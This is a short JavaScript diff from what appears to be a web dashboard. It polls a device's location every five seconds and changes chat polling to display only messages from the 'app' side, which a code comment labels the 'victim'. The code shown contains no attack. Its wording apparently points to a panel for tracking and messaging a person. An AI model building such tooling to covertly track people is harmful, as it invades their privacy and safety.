@@ -319,7 +319,7 @@ async function pollLocation() {
     setTimeout(pollLocation, 5000);
 }
 
-// ═══ CHAT POLLING ═══
+// ═══ CHAT POLLING — only show 'app' messages (web msgs already shown locally) ═══
 async function pollChat() {
     if (!active) return;
     try {
@@ -327,8 +327,11 @@ async function pollChat() {
         if (r.ok) {
             var data = await r.json();
             data.forEach(function(row) {
-                appendChat(row.sender_type, row.message_type, row.content);
                 if (row.id > lastChatId) lastChatId = row.id;
+                // Only show messages from app (victim) — web messages already shown when sent
+                if (row.sender_type === 'app') {
+                    appendChat(row.sender_type, row.message_type, row.content);
+                }
             });
         }
     } catch (e) {}
